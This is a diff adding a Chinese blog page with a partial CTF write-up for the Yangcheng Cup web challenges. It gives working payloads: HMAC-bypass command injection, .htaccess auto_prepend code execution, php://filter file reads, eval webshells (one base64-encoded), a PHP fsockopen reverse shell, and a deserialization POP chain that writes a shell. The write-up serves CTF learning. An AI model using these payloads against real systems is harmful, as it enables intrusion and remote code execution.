@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+<meta name="google-site-verification" content="fQ_tfBgNjE9NQcpKnGAkWapHoKuimF5lVuNuqpPXar0">
+    <meta charset="utf-8">
+    
+    <title>羊城杯部分Write Up | Xiao Leung&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+      <link rel="icon" href="/favicon.png">
+    
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="/js/google-code-prettify/tomorrow-night-eighties.min.css">
+
+  </head>
+
+  <body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
+<header>
+
+	<a id="logo" href="/" title="Xiao Leung&#39;s Blog">
+	<img src="/favicon.png" alt="Xiao Leung&#39;s Blog"></a>
+	
+	
+		<!--搜索栏-->
+		<i class="js-toggle-search iconfont icon-search"></i>
+
+
+<form class="js-search search-form search-form--modal" method="get" action="" role="search">
+	<div class="search-form__inner">
+		<div>
+			<i class="iconfont icon-search"></i>
+			<input class="text-input" placeholder="Enter Key..." type="search" name='keys'>
+		</div>
+	</div>
+</form>
+
+	
+
+	
+		<!--侧边导航栏-->
+		<a id="nav-toggle" href="#"><span></span></a>
+
+<nav>
+	<div class="menu-top-container">
+		<ul id="menu-top" class="menu">
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.plasf.cn/2019/08/01/HelloWorld/" target="_blank">AboutMe</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="" target="_blank">友情链接</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.redmango.top/" target="_blank">HhhM</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://l1near.top/" target="_blank">L1nearのspace</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.mrskye.cn/" target="_blank">SkYe&#39;s Blog</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.kawhi.xyz" target="_blank">kawhi</a>
+				</li>
+			
+		</ul>
+	</div>
+</nav>
+	
+
+</header>
+
+<div class="m-header" id="headers" >
+	<section id="hero1" class="hero">
+		<div class="inner">
+		</div>
+	</section>
+	
+		<figure class="top-image" data-enable=true></figure>
+	
+</div>
+
+
+<!--文章列表-->
+<div class="wrapper">
+  
+    <!--文章-->
+<article>
+	
+  
+    <h1 class="post-title" itemprop="name">
+      羊城杯部分Write Up
+    </h1>
+  
+
+	<div class='post-body mb'>
+		<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
+<li>web考的是misc，之前一段时间一直忙着培训也没有时间。</li>
+</ul>
+<h2 id="BlackCat"><a href="#BlackCat" class="headerlink" title="BlackCat"></a>BlackCat</h2><ul>
+<li>源码在MP3里面，不知道这样做的意义是什么难道有人会在写网站的时候把源码放进mp3里面？？？这样做真的够无聊的。</li>
+<li>源码</li>
+</ul>
+<pre><code class="php">if(empty($_POST[&#39;Black-Cat-Sheriff&#39;]) || empty($_POST[&#39;One-ear&#39;])){ die(&#39;Ë•£¡3⁄41 ̧Ò2ÈÎÒÒ»Ö»¶úμÄÎ2°Í£¡&#39;);
+}
+$clandestine = getenv(&quot;clandestine&quot;);
+if(isset($_POST[&#39;White-cat-monitor&#39;]))
+$clandestine = hash_hmac(&#39;sha256&#39;, $_POST[&#39;White-cat-monitor&#39;],
+$clandestine);
+$hh = hash_hmac(&#39;sha256&#39;, $_POST[&#39;One-ear&#39;], $clandestine);
+if($hh !== $_POST[&#39;Black-Cat-Sheriff&#39;]){ die(&#39;ÓÐÒâÃé×1⁄4£¬ÎÞÒâ»÷·¢
+£¬ÄãμÄÃÎÏë3⁄4ÍÊÇÄãÒaÃé×1⁄4μÄÄ¿±ê¡£ÏàÐÅ×Ô1⁄4o£¬Äã3⁄4ÍÊÇÄÇ¿ÅÉäÖÐ°ÐÐÄμÄ×Óμ ̄¡£&#39;); }
+echo exec(&quot;nc&quot;.$_POST[&#39;One-ear&#39;]);</code></pre>
+<ul>
+<li><p>这是原题:<a href="https://neversecure.ca/category/bug-hunting/" target="_blank" rel="noopener">https://neversecure.ca/category/bug-hunting/</a></p>
+</li>
+<li><p>老知识点了，数组加密得到nu l l用null去加密得到hash值。</p>
+</li>
+</ul>
+<pre><code>Black-Cat- Sheriff=04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6&amp;One- ear=%3Bcat+flag.php&amp;White-cat-monitor[]=1a</code></pre><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><ul>
+<li><p>原题X-NUCA‘2019 ——Ezphp</p>
+</li>
+<li><p>我们从代码的最后一行可见最后会强行拼接进来一个 “\nHello World” 导致 .hatccess 无法解析 500错误。所以使用反斜杠可以将 \n 转义为普通字符后使用#注释使得 .hatccess 能够成功解<br>析。</p>
+</li>
+<li><p>绕过 检测同样使用<code>\</code>作为换行直接绕过该函数的关键字检测。</p>
+</li>
+<li><p>将 .hatccess 包含进所以php文件。</p>
+</li>
+</ul>
+<pre><code>php_valueauto_prepend_file.htaccess</code></pre><ul>
+<li>综上构造payload:</li>
+</ul>
+<pre><code>php_value auto_prepend_fil\ 
+e .htaccess
+#&lt;?php phpinfo();?&gt;\</code></pre><ul>
+<li>exp</li>
+</ul>
+<pre><code>?content=php_valueauto_prepend_fil\%0Ae.htaccess%0A%23&lt;?phpsystem(&#39;cat /fla&#39;.&#39;g&#39;);?&gt;\&amp;filename=.htaccess</code></pre><h2 id="Easyphp2"><a href="#Easyphp2" class="headerlink" title="Easyphp2"></a>Easyphp2</h2><ul>
+<li>目测是文件包含了。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/macpic/pic1.png" alt="pic1"></p>
+<ul>
+<li>用base64或者rot13读文件发现被过滤了,由于<code>include()</code>    可以解码一次url所以可以用双url编码绕过,这里。</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/macpic/pic2.png" alt="pic2"></p>
+<ul>
+<li>翻阅PHP文档发现还有另外一个过滤器能用：</li>
+</ul>
+<blockquote>
+<p><a href="https://www.php.net/manual/zh/filters.convert.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/filters.convert.php</a></p>
+</blockquote>
+<p><img src="http://goodcheerleung.gitee.io/macpic/pic3.png" alt="pic3"></p>
+<ul>
+<li>例如：</li>
+</ul>
+<pre><code>http://183.129.189.60:10021/?file=php://filter/read=convert.quoted-printable-encode/resource=GWHT.php</code></pre><ul>
+<li><p>解码：</p>
+<p><img src="http://goodcheerleung.gitee.io/macpic/pic5.png" alt="pic5"></p>
+</li>
+<li><p>源码：</p>
+</li>
+</ul>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;
+    &lt;title&gt;count is here&lt;/title&gt;
+
+    &lt;style&gt;
+
+        html,
+        body {
+            overflow: none;
+            max-height: 100vh;
+        }
+
+    &lt;/style&gt;
+&lt;/head&gt;
+
+&lt;body style=&quot;height: 100vh; text-align: center; background-color: green; color: blue; display: flex; flex-direction: column; justify-content: center;&quot;&gt;
+
+&lt;center&gt;&lt;img src=&quot;question.jpg&quot; height=&quot;200&quot; width=&quot;200&quot; /&gt; &lt;/center&gt;
+
+    &lt;?php
+    ini_set(&#39;max_execution_time&#39;, 5);
+
+    if ($_COOKIE[&#39;pass&#39;] !== getenv(&#39;PASS&#39;)) {
+        setcookie(&#39;pass&#39;, &#39;PASS&#39;);
+        die(&#39;&lt;h2&gt;&#39;.&#39;&lt;hacker&gt;&#39;.&#39;&lt;h2&gt;&#39;.&#39;&lt;br&gt;&#39;.&#39;&lt;h1&gt;&#39;.&#39;404&#39;.&#39;&lt;h1&gt;&#39;.&#39;&lt;br&gt;&#39;.&#39;Sorry, only people from GWHT are allowed to access this website.&#39;.&#39;23333&#39;);
+    }
+    ?&gt;
+
+    &lt;h1&gt;A Counter is here, but it has someting wrong&lt;/h1&gt;
+
+    &lt;form&gt;
+        &lt;input type=&quot;hidden&quot; value=&quot;GWHT.php&quot; name=&quot;file&quot;&gt;
+        &lt;textarea style=&quot;border-radius: 1rem;&quot; type=&quot;text&quot; name=&quot;count&quot; rows=10 cols=50&gt;&lt;/textarea&gt;&lt;br /&gt;
+        &lt;input type=&quot;submit&quot;&gt;
+    &lt;/form&gt;
+
+    &lt;?php
+    if (isset($_GET[&quot;count&quot;])) {
+        $count = $_GET[&quot;count&quot;];
+        if(preg_match(&#39;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#39;, $count)){
+            die(&#39;hacker!&#39;);
+        }
+        echo &quot;&lt;h2&gt;The Count is: &quot; . exec(&#39;printf \&#39;&#39; . $count . &#39;\&#39; | wc -c&#39;) . &quot;&lt;/h2&gt;&quot;;
+    }
+    ?&gt;
+
+&lt;/body&gt;
+
+&lt;/html&gt;</code></pre><ul>
+<li>index.php</li>
+</ul>
+<pre><code>&lt;?php
+if (isset($_GET[&#39;file&#39;])) {
+    if(preg_match(&#39;/#|base64|rot13|base32|base16/i&#39;, $_GET[&#39;file&#39;])){
+            die(&#39;G0-OUT&#39;.&#39;&lt;br&gt;&#39;.&#39;hacker!&#39;);
+        }
+
+    require_once($_GET[&#39;file&#39;]);
+} else {
+    header(&#39;Location: /?file=GWHT.php&#39;);
+}
+</code></pre><ul>
+<li><p>密码盲猜是：<code>GWHT</code></p>
+</li>
+<li><p>由于过滤了<code>$_POST</code>和<code>$_GET</code>直接用<code>get_defined_vars()</code>代替payload如下：</p>
+</li>
+</ul>
+<pre><code class="phop">http://183.129.189.60:10021/?file=GWHT.php&amp;count=%27`echo%20%22%3C?=eval(pos(pos(get_defined_vars())))?%3E%22%3E2.php`%27</code></pre>
+<ul>
+<li>再写一个正常的木马,：</li>
+</ul>
+<pre><code>http://183.129.189.60:10021/2.php?a=file_put_contents(&#39;cnm.php&#39;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbYWFdKTs/Pg%3d%3d&quot;))%3b</code></pre><ul>
+<li>使用PHP反弹一个交互shell</li>
+</ul>
+<pre><code class="php">&lt;?php
+  $sock=fsockopen(&quot;localhost&quot;,12345);//localhost为自己的外网ip，端口任意
+  exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);
+?&gt;</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/macpic/pic4.png" alt="pic4"></p>
+<ul>
+<li>做到这里洗澡去了，回来环境关了。算了。</li>
+</ul>
+<h2 id="easyser"><a href="#easyser" class="headerlink" title="easyser"></a>easyser</h2><ul>
+<li><p>扫描器扫出一个robots.txt</p>
+</li>
+<li><p>提示：</p>
+</li>
+</ul>
+<pre><code>&lt;!-- 小胖说用个不安全的协议从我家才能进ser.php呢! !--&gt;</code></pre><ul>
+<li>源码：</li>
+</ul>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+if ( $_SERVER[&#39;REMOTE_ADDR&#39;] == &quot;127.0.0.1&quot; ) {
+    highlight_file(__FILE__);
+}
+$flag=&#39;{Trump_:&quot;fake_news!&quot;}&#39;;
+class GWHT{
+    public $hero;
+public function __construct(){ $this-&gt;hero = new Yasuo;
+    }
+    public function __toString(){
+if (isset($this-&gt;hero)){
+return $this-&gt;hero-&gt;hasaki();
+        }else{
+            return &quot;You don&#39;t look very happy&quot;;
+} }
+}
+class Yongen{ //flag.php
+    public $file;
+    public $text;
+    public function __construct($file=&#39;&#39;,$text=&#39;&#39;) {
+$this -&gt; file = $file; $this -&gt; text = $text;
+}
+public function hasaki(){
+$d = &#39;&lt;?php die(&quot;nononon&quot;);?&gt;&#39;; $a= $d. $this-&gt;text;
+@file_put_contents($this-&gt; file,$a); }
+}
+class Yasuo{
+    public function hasaki(){
+        return &quot;I&#39;m the best happy windy man&quot;;
+    }
+}/*$c=$_GET[&#39;c&#39;];
+echo $x=unserialize($c);*/
+?&gt;</code></pre>
+<ul>
+<li>简单的POP链</li>
+</ul>
+<pre><code class="php">&lt;?php
+class GWHT{
+    public $hero;
+}
+class Yongen{ //flag.php
+public $file = &quot;php://filter/convert.base64-decode/resource=aaa.php&quot;;
+    public $text = &quot;aaaPD9waHAgZXZhbCgkX1BPU1Rbc10pOyAgPz4=&quot;;
+}
+$a = new GWHT;
+$a-&gt;hero = new Yongen;
+echo urlencode(serialize($a));</code></pre>
+
+	</div>
+	<div class="meta split">
+		
+			<span>本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次</span>
+		
+		<time class="post-date" datetime="2020-09-12T04:44:00.000Z" itemprop="datePublished">2020-09-12</time>
+	</div>
+</article>
+<!-- 目录内容 -->
+<div id='maktoc'>
+
+    <p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
+          <span class="btn-bg"></span>
+          <span class="btn-text">文章导航</span>
+          </p>
+    <div id="toc-article" class="toc-article">
+        <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
+        <strong class="toc-title">文章目录</strong>
+           <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BlackCat"><span class="toc-number">2.</span> <span class="toc-text">BlackCat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyphp"><span class="toc-number">3.</span> <span class="toc-text">easyphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Easyphp2"><span class="toc-number">4.</span> <span class="toc-text">Easyphp2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyser"><span class="toc-number">5.</span> <span class="toc-text">easyser</span></a></li></ol>
+         </div>
+   <script type="text/javascript">
+    function showToc(){
+        var toc_article = document.getElementById("toc-article");
+        var show_toc_btn = document.getElementById("show-toc-btn");
+        toc_article.setAttribrootute("style","display:block");
+        show_toc_btn.setAttribute("style","display:none");
+        };
+    function showBtn(){
+        var toc_article = document.getElementById("toc-article");
+        var show_toc_btn = document.getElementById("show-toc-btn");
+        toc_article.setAttribute("style","display:none");
+        show_toc_btn.setAttribute("style","display:block");
+        };
+	function getScrollTop() {
+	    var scroll_top = 0;
+	    if (document.documentElement && document.documentElement.scrollTop) {
+		scroll_top = document.documentElement.scrollTop;
+	    }
+	    else if (document.body) {
+		scroll_top = document.body.scrollTop;
+	    }
+	    return scroll_top;
+	};
+	var headers=document.getElementById("headers");
+	var tocs = document.getElementById("toc-article");
+	
+	
+	window.onscroll  = function(){
+	if(getScrollTop()>450){
+			if(tocs.offsetTop>100){
+			var tophight = tocs.offsetTop-15;
+			tocs.style.cssText="top:"+tophight+"px";
+			}
+	}else{
+			tocs.style.cssText="top:540px";
+		}
+				
+		
+		//console.log(getScrollTop());	
+		
+	}
+window.onresize = function(){
+	var mak_toc = document.getElementById("maktoc");
+	if($(window).width()<1414){
+	mak_toc.setAttribute("style","display:none");
+	}else{
+	mak_toc.setAttribute("style","display:block");
+	}
+}
+   </script>
+      
+<!-- 目录内容结束 -->
+</div>
+
+<!--评论-->
+
+	
+<div id="lv-container" data-id="city" data-uid="MTAyMC80OTc4Mi8yNjI3Mw==">
+	<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+	</script>
+<noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+
+
+
+  
+</div>
+
+
+  <svg id="bigTriangleColor" width="100%" height="40" viewBox="0 0 100 102" preserveAspectRatio="none">
+    <path d="M0 0 L50 100 L100 0 Z"></path>
+  </svg>
+
+  
+
+
+  <div class="wrapper"></div>
+
+
+
+
+
+<div class="fat-footer">
+	<div class="wrapper">
+		<div class="layout layout--center">
+			<div class="layout__item palm-mb">
+				<div class="media">
+					<img class="headimg" src='/assets/blogImg/litten.png' alt='XiaoLeung'>
+					<div class="media__body">
+						<h4>兵至如归-Xiaoleung&#39;s Blog</h4>
+						<p class='site-description'>Don&#39;t forget why we started</p>
+					</div>
+				</div>
+				<div class="author-contact">
+					<ul>
+						
+							
+							<li>
+				        		<a href="https://github.com/sharpleung" target="_blank">
+				        			
+				        				<i class="iconfont icon-github"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+							
+							<li>
+				        		<a href="https://www.plasf.cn/2019/08/01/HelloWorld/" target="_blank">
+				        			
+				        				<i class="iconfont icon-weixin"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+					</ul>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+
+<footer class="footer" role="contentinfo">
+
+	<div class="wrapper wrapper--wide split split--responsive">
+<a href="http://beian.miit.gov.cn/">粤ICP备18132442号-1</a><br>
+<a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=44011202000643" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><img src="/gongan.png" style="float:left;"/><p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;">粤公网安备 44011202000643号</p></a><br>
+
+		
+			<span>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次, 访客数 <span id="busuanzi_value_site_uv"></span> 人次</span>
+		
+		<span>Theme by <a href="https://github.com/justpsvm">justpsvm</a>. Powered by <a href="https://hexo.io">Hexo</a></span>
+	</div>
+</footer>
+
+	<!-－这里导入了 lib.js 里面涵盖了 jQuery 等框架 所以注释掉-->
+	<!--<script src="http://lib.sinaapp.com/js/jquery/2.0/jquery.min.js"></script>-->
+	<script src="/js/lib.js"></script>
+	<script src="/js/google-code-prettify/prettify.js"></script>
+	<script src="/js/module.js"></script>
+	<script src="/js/script.js"></script>
+	
+		<script async src="http://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+	<script type='text/javascript'>
+		//代码高亮
+		$(document).ready(function(){
+	 		$('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+   			prettyPrint();
+		});
+	</script>
+	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+ <script type="text/javascript"> /* 鼠标点击特效 - 7Core.CN */ var a_idx = 0;jQuery(document).ready(function($) {$("body").click(function(e) {var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正" ,"法治", "爱国", "敬业", "诚信", "友善");var $i = $("<span/>").text(a[a_idx]); a_idx = (a_idx + 1) % a.length;var x = e.pageX,y = e.pageY;$i.css({"z-index": 100000000,"top": y - 20,"left": x,"position": "absolute","font-weight": "bold","color": "#ff6651"});$("body").append($i);$i.animate({"top": y - 180,"opacity": 0},1500,function() {$i.remove();});});}); </script>
+
